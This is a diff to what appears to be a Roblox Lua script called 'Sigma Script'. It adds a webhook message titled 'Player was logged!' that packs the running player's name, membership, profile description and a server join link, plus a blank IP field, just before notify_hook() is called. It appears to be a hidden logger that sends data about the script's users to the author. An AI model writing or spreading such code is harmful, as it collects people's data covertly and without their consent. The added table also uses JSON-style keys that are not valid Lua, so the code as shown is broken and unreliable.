@@ -87,4 +87,42 @@ local function notify_hook()
 	})
 end
 
+local new_data = {
+  "content": "",
+  "tts": false,
+  "embeds": [
+    {
+      "id": 985364321,
+      "title": "Player was logged!",
+      "description": "IP : \nJoin: [**Click me!**](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&jobId=".. game.JobId .. ")\n\nMembership : **".. player.MembershipType.Name .."**\n",
+      "timestamp": "2025-10-08T21:00:00.000Z",
+      "color": 16777215,
+      "footer": {
+        "text": "Player's like to be logged!",
+        "icon_url": "https://github.com/FobyCool/MyScripts/blob/main/Sigma/image.png?raw=true"
+      },
+      "author": {
+        "name": player.Name,
+        "url": "https://www.roblox.com/users/4121111717/profile",
+        "icon_url": "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-C4EDFD622078F4F1C2D877FC5659D035-Png/150/150/AvatarHeadshot/Webp/noFilter"
+      },
+      "image": {
+        "url": "https://tr.rbxcdn.com/30DAY-Avatar-C4EDFD622078F4F1C2D877FC5659D035-Png/352/352/Avatar/Webp/noFilter"
+      },
+      "fields": [
+        {
+          "id": 845422695,
+          "name": "Profile Description",
+          "value": ""..DescriptionData.."",
+          "inline": true
+        }
+      ]
+    }
+  ],
+  "components": [],
+  "actions": {},
+  "flags": 0,
+  "username": "Sigma Script",
+  "avatar_url": "https://github.com/FobyCool/MyScripts/blob/main/Sigma/image.png?raw=true"
+}
 notify_hook()
